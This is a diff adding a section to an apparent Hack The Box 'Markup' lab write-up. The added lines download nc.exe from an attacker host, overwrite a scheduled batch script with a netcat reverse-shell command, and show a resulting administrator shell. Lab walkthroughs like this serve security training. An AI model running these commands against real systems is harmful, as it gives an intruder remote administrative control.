@@ -154,6 +154,35 @@ We can change the contents of the script to either initiate a reverse shell back
 
 Let's get ```nc.exe``` on the target machine and write a command into the script that will initiate a connection back to a listener we can start up.
 
+```
+PS C:\Log-Management> wget http://10.10.14.95:8000/nc.exe -outfile nc32.exe
+daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc32.exe -e cmd.exe 10.10.14.95 4444 > C:\Log-Management\job.bat
+```
+
+Waiting a bit for the script to run, we get a shell back as the administrator.
+
+```
+┌─[us-starting-point-1-dhcp]─[10.10.14.95]─[htb-mp-3199654@htb-ffqer9osiz]─[~]
+└──╼ [★]$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.95.192 49800
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /user
+whoami /user
+
+USER INFORMATION
+----------------
+
+User Name            SID                                         
+==================== ============================================
+markup\administrator S-1-5-21-103432172-3528565615-2854469147-500
+```
+
+We can proceed to get the root flag from here.
+
+Nice pwn!
 
 ## Contact
 
